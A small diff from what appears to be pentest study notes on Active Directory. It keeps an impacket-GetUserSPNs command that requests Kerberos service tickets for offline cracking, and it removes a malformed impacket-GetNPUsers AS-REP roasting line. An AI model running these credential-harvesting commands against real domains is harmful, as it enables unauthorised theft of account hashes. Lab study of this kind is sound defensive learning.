@@ -30,10 +30,6 @@ using impacket-GetUserSPNs :
 ```bash
 impacket-GetUserSPNs -request -dc-ip 192.168.44.166 UAP.local/fcastle -save -outputfile GetUserSPNs1.out
 
-
-impacket-GetNPUsers FRIEND.local /-dc-ip ipadress -usersfile list.users.txt -request
-
-
 ```
 
 using nxc:
